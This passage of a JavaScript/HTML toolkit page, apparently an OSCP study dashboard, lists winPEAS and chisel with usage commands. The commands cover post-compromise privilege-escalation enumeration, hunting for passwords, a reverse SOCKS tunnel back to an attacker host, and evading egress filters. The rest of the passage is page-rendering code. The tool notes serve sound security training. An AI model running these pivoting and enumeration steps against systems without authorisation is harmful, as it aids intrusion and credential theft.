                  <li>After gaining initial access to Windows</li>
                  <li>To find privilege escalation vectors</li>
                  <li>When PowerShell is restricted</li>
                </ul>

                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Upload and run
winpeasx64.exe

# Quiet mode
winpeasx64.exe quiet

# Only check specific sections
winpeasx64.exe userinfo

# Output to file
winpeasx64.exe > C:\\temp\\winpeas.txt</pre>

                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Look for <span style="color:#ff6b6b;">RED</span> sections — high priority findings</li>
                  <li>Check "Interesting Processes" for antivirus or EDR</li>
                  <li>Search for passwords in memory or files</li>
                  <li>For OSCP: Often finds unquoted service paths, DLL hijacking</li>
                </ul>
              `,
              tags: ["windows", "privesc", "enum", "peass", "executable", "privilege escalation"],
              phase: "01_recon_enum"
            },
            {
              name: "chisel",
              desc: "Tunneling for pivoting",
              file: "chisel",
              dup: "from 01",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is chisel?</div>
                <p>A fast, encrypted TCP/UDP tunnel over HTTP(S). Create SOCKS proxies or port forwards through firewalls. Essential for pivoting in internal networks.</p>

                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>When you compromise a machine inside a network</li>
                  <li>To access internal services (SMB, RDP, databases)</li>
                  <li>To route tools like nmap, bloodhound, or metasploit through the pivot</li>
                </ul>

                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# On your attacking machine (server)
./chisel server -p 8080 --reverse

# On compromised target (client)
./chisel client YOUR_IP:8080 R:socks

# Now set proxychains
proxychains nmap -sT -Pn -n -p 80,445,3389 192.168.1.0/24

# Forward single port
./chisel client YOUR_IP:8080 R:3389:192.168.1.10:3389</pre>

                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Use <code>--auth user:pass</code> for extra security</li>
                  <li>Works over HTTP — often bypasses egress filters</li>
                  <li>For OSCP: SOCKS proxy + proxychains is your best friend</li>
                  <li>If blocked, try DNS or ICMP tunneling alternatives</li>
                </ul>
              `,
              tags: ["tunnel", "pivot", "socks", "proxy", "firewall bypass", "proxychains", "chisel"],
              phase: "01_recon_enum"
            },
          ]
        }
      ]
    },
     ];
    // … (the rest of the phases: 02_initial_access, 03_active_directory, 04_privilege_escalation, 05_credentials_looting, 06_reverse_engineering)
    // All your objects are here unchanged.


    
 




  














  
  /* ----------   RENDER UI   ---------- */
  function render() {
    container.innerHTML = '';
    data.forEach(phase => {
      const phaseEl = document.createElement('div');
      phaseEl.className = 'phase';
      if (phase.name.includes('01_recon_enum')) phaseEl.classList.add('open');
      phaseEl.innerHTML = `
        <div class="phase-header">${escapeHtml(phase.name)}</div>
        <div class="phase-content"></div>
      `;
      const phaseContent = phaseEl.querySelector('.phase-content');
      phase.tools.forEach(cat => {
        const catEl = document.createElement('div');
        catEl.className = 'category';
        if (cat.cat === 'wordlists/' && phase.name.includes('01_recon_enum')) catEl.classList.add('open');
        catEl.innerHTML = `
          <div class="category-header">${escapeHtml(cat.cat)}</div>
          <div class="category-content"></div>
        `;
        const catContent = catEl.querySelector('.category-content');
        let toolsHtml = '';
        cat.items.forEach(tool => {
          const toolId = toolIdCounter++;
          toolLookup[toolId] = tool;
          toolsHtml += `
            <div class="tool">
              <div class="tool-info">
                <div>
                  <span class="tool-name">${escapeHtml(tool.name)}</span>
                  ${tool.dup ? `<span class="dup">↔ ${escapeHtml(tool.dup)}</span>` : ''}
                </div>
                <div class="desc">${escapeHtml(tool.desc)}</div>
              </div>
              <div class="tool-actions">
                <button class="btn" onclick="showInfo(${toolId})">ℹ️ Info</button>
                <button class="btn" onclick="downloadTool('${escapeHtml(tool.file)}')">⬇️ Download</button>
              </div>
            </div>
          `;
        });
        catContent.innerHTML = toolsHtml;
        catEl.querySelector('.category-header').addEventListener('click', e => {
          e.stopPropagation();
          catEl.classList.toggle('open');
        });
        phaseContent.appendChild(catEl);
      });
      phaseEl.querySelector('.phase-header').addEventListener('click', () => {
        phaseEl.classList.toggle('open');
      });
      container.appendChild(phaseEl);
    });
  }

  /* ----------   LOADING / DISPLAY   ---------- */
  setTimeout(() => {
    loader.style.opacity = '0';
    loader.style.transition = 'opacity 0.5s ease';
    setTimeout(() => {
      loader.style.display = 'none';
      app.style.display = 'block';
      render();
    }, 500);
  }, 1500);
});
